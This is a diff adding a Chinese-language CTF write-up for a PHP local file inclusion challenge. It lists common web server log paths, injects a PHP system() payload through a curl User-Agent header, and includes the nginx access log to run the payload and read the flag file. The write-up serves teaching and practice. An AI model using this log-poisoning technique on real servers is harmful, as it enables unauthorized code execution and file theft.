@@ -1,1 +1,69 @@
+🔍 解题过程
+第一步：理解题目环境
+打开页面，是一个简单的表单，可以输入文件路径并提交。
 
+首先需要知道：这是一个 LFI（Local File Inclusion，本地文件包含） 漏洞。核心代码类似：
+
+php
+<?php include($_POST['file']); ?>
+用户可以指定任意文件，服务器会读取并执行该文件。如果文件中包含 PHP 代码（<?php ... ?>），这些代码会被执行。
+
+第二步：寻找日志文件
+日志文件记录了所有访问请求，包括 User-Agent、Referer 等信息。如果能够包含日志文件，并且日志中写入了 PHP 代码，代码就会被执行。
+
+常见的日志文件路径：
+
+服务器	日志路径
+Nginx	/var/log/nginx/access.log
+Apache	/var/log/apache2/access.log
+Apache	/var/log/httpd/access_log
+尝试 1：输入 /var/log/apache2/access.log
+
+结果：
+
+text
+Warning: include(/var/log/apache2/access.log): failed to open stream: No such file or directory
+这个路径不存在，说明服务器可能不是 Apache。
+
+尝试 2：输入 /var/log/nginx/access.log
+
+结果：成功返回了日志内容！
+
+text
+172.12.0.2 - - [19/Apr/2026:14:34:58 +0000] "GET / HTTP/1.1" 200 963 "https://ctf.show/" "Mozilla/5.0..."
+确认日志文件路径是 /var/log/nginx/access.log。
+
+第三步：注入 PHP 代码到日志
+要让日志文件中的代码被执行，需要先在日志中写入 PHP 代码。
+
+日志会记录 HTTP 请求中的 User-Agent 字段。所以我们可以修改 User-Agent，在其中插入 PHP 代码。
+
+使用 curl 发送恶意请求：
+
+bash
+curl -A "<?php system('cat flag.php'); ?>" "https://目标网址/"
+这条命令会：
+
+发送一个 GET 请求到目标网站
+
+User-Agent 被设置为 <?php system('cat flag.php'); ?>
+
+服务器将这个请求记录到 access.log 中
+
+发送后，日志文件中会多出一条记录，User-Agent 部分就是我们的 PHP 代码。
+
+第四步：包含日志文件执行代码
+再次在题目输入框中输入：
+
+text
+/var/log/nginx/access.log
+点击 Include file。
+
+服务器执行 include('/var/log/nginx/access.log')，读取日志文件。当日志解析到 <?php system('cat flag.php'); ?> 时，PHP 代码被执行，cat flag.php 的输出会显示在页面上。
+
+第五步：获取 Flag
+执行后，页面显示：
+
+text
+CTF{php_access_l0g_lf1_is_fun}
+成功拿到 flag
